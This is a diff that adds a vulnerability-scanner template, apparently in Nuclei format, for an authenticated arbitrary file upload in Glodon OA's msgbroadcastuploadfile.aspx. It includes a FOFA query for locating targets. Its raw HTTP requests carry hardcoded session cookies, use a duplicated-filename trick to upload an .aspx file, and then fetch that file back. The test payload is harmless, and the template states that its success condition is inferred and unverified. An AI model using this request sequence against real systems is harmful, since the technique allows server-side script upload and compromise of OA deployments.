@@ -1,0 +1,54 @@
+id: poc-452d28092566b1b3771e
+info:
+  name: 广联达OA后台msgbroadcastuploadfile.aspx任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/452d28092566b1b3771e577b1bbde065
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 452d28092566b1b3771e577b1bbde065
+    fofa: + app.name="广联达 OA"
+http:
+- raw:
+  - 'POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Cookie: 0_styleName=styleA; ASP.NET_SessionId=iujpmeeoodatd3valrfzlybx; GTP_IdServer_LangID=2052; .ASPXAUTH=C07DD2AB8669EC488CEC31D5290CD2329A8D4A672DC579B15BF250A1AB0C457E32E3B74C3C5339217DB1ABF71F302CE29B12E2988BE1EDA7BD39515525C0885A086FD123D50953E91BEBFDD88D731383DB986843A483119D9C66569100EE12DF7B7E0E242CC663A9B4663D176D9181EC8095DFC63F22386362387F521C179730; portal_default_menu_name_0=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file" filename="1.aspx";filename="1.jpg"
+
+    Content-Type: application/text
+
+
+    test
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /GTP/IM/Services/Group/Upload/259653de-0020-4743-a130-e092ca4d9e6a-1.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: 0_styleName=styleA; ASP.NET_SessionId=iujpmeeoodatd3valrfzlybx; GTP_IdServer_LangID=2052; .ASPXAUTH=C07DD2AB8669EC488CEC31D5290CD2329A8D4A672DC579B15BF250A1AB0C457E32E3B74C3C5339217DB1ABF71F302CE29B12E2988BE1EDA7BD39515525C0885A086FD123D50953E91BEBFDD88D731383DB986843A483119D9C66569100EE12DF7B7E0E242CC663A9B4663D176D9181EC8095DFC63F22386362387F521C179730; portal_default_menu_name_0=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
